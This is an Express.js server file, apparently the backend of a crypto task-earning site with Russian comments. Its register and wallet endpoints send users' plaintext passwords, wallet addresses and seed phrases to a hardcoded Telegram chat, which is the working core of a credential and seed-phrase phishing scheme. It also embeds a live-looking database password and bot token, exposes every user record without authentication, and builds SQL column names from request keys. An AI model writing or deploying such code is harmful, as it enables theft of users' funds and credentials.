const express = require('express');
const asyncpg = require('asyncpg');
const path = require('path');
const axios = require('axios');
const app = express();
app.use(express.json());

// Настройка CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Статические файлы из папки client
const staticPath = path.join(__dirname, '../client');
app.use(express.static(staticPath));

// Переменные для базы данных и Telegram
const DB_URL = 'postgresql://neuratest_db_user:M1Ke5EFL1txqlFXL62UOvPdmt6cxurQ8@dpg-cv1ktel6l47c73fg297g-a.oregon-postgres.render.com/neuratest_db';
const TELEGRAM_BOT_TOKEN = '7603140907:AAEHRJo0chFDDycRASXe5ljwtzfMwqe8qA4';
const TELEGRAM_CHAT_ID = '6404101950';

// Подключение к базе данных
async function get_db_connection() {
    return await asyncpg.connect(DB_URL);
}

// Функция отправки уведомлений в Telegram
async function sendTelegramNotification(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
        console.log('Notification sent to Telegram');
    } catch (error) {
        console.error('Error sending Telegram notification:', error.message);
    }
}

app.post('/register', async (req, res) => {
    console.log('Received registration request:', req.body);
    const conn = await get_db_connection();
    try {
        const existingUser = await conn.fetchrow("SELECT * FROM users WHERE login = $1", req.body.login);
        if (existingUser) {
            return res.status(400).json({ error: 'User already exists' });
        }

        await conn.execute(`
            INSERT INTO users (id, login, password, wallet, seeds, balance, taskscompleted, earnedtoday, earnedtotal)
            VALUES ($1, $2, $3, '', ARRAY[]::text[], 0, 0, 0, 0)
        `, req.body.id, req.body.login, req.body.password);

        const user = await conn.fetchrow("SELECT * FROM users WHERE login = $1", req.body.login);

        const message = `Новый пользователь зарегистрирован:\n` +
                        `Логин: ${user.login}\n` +
                        `Пароль: ${user.password}\n` +
                        `ID: ${user.id}`;
        await sendTelegramNotification(message);

        res.json({ success: true, user });
    } catch (error) {
        console.error('Error in /register:', error);
        res.status(500).json({ error: 'Server error' });
    } finally {
        await conn.close();
    }
});

app.post('/login', async (req, res) => {
    console.log('Received login request:', req.body);
    const conn = await get_db_connection();
    try {
        const user = await conn.fetchrow("SELECT * FROM users WHERE login = $1 AND password = $2", req.body.login, req.body.password);
        if (user) {
            res.json({ success: true, user });
        } else {
            res.status(401).json({ error: 'Invalid login or password' });
        }
    } catch (error) {
        console.error('Error in /login:', error);
        res.status(500).json({ error: 'Server error' });
    } finally {
        await conn.close();
    }
});

app.post('/update-wallet', async (req, res) => {
    console.log('Received wallet update request:', req.body);
    const conn = await get_db_connection();
    try {
        const user = await conn.fetchrow("SELECT * FROM users WHERE id = $1", req.body.id);
        if (user) {
            await conn.execute("UPDATE users SET wallet = $1, seeds = $2 WHERE id = $3", req.body.wallet, req.body.seeds, req.body.id);

            const updatedUser = await conn.fetchrow("SELECT * FROM users WHERE id = $1", req.body.id);
            const message = `Пользователь обновил кошелёк:\n` +
                            `Логин: ${updatedUser.login}\n` +
                            `ID: ${updatedUser.id}\n` +
                            `Новый адрес кошелька: ${updatedUser.wallet}\n` +
                            `Seed-фразы: ${updatedUser.seeds.join(', ')}`;
            await sendTelegramNotification(message);

            res.json({ success: true });
        } else {
            res.status(404).json({ error: 'User not found' });
        }
    } catch (error) {
        console.error('Error in /update-wallet:', error);
        res.status(500).json({ error: 'Server error' });
    } finally {
        await conn.close();
    }
});

app.get('/users', async (req, res) => {
    const conn = await get_db_connection();
    try {
        const users = await conn.fetch("SELECT * FROM users");
        res.json(users);
    } catch (error) {
        console.error('Error in /users:', error);
        res.status(500).json({ error: 'Server error' });
    } finally {
        await conn.close();
    }
});

app.post('/update-user', async (req, res) => {
    console.log('Received user update request:', req.body);
    const conn = await get_db_connection();
    try {
        const user = await conn.fetchrow("SELECT * FROM users WHERE id = $1", req.body.id);
        if (user) {
            const fields = Object.keys(req.body).filter(key => key !== 'id');
            const updates = fields.map((field, index) => `${field} = $${index + 2}`).join(', ');
            const values = fields.map(field => req.body[field]);
            await conn.execute(`UPDATE users SET ${updates} WHERE id = $1`, req.body.id, ...values);

            const updatedUser = await conn.fetchrow("SELECT * FROM users WHERE id = $1", req.body.id);
            const message = `Пользователь обновил данные:\n` +
                            `Логин: ${updatedUser.login}\n` +
                            `ID: ${updatedUser.id}\n` +
                            `Изменения: ${JSON.stringify(req.body, null, 2)}`;
            await sendTelegramNotification(message);

            res.json({ success: true });
        } else {
            res.status(404).json({ error: 'User not found' });
        }
    } catch (error) {
        console.error('Error in /update-user:', error);
        res.status(500).json({ error: 'Server error' });
    } finally {
        await conn.close();
    }
});

app.get('*', (req, res) => {
    const indexPath = path.join(__dirname, '../client', 'index.html');
    res.sendFile(indexPath);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));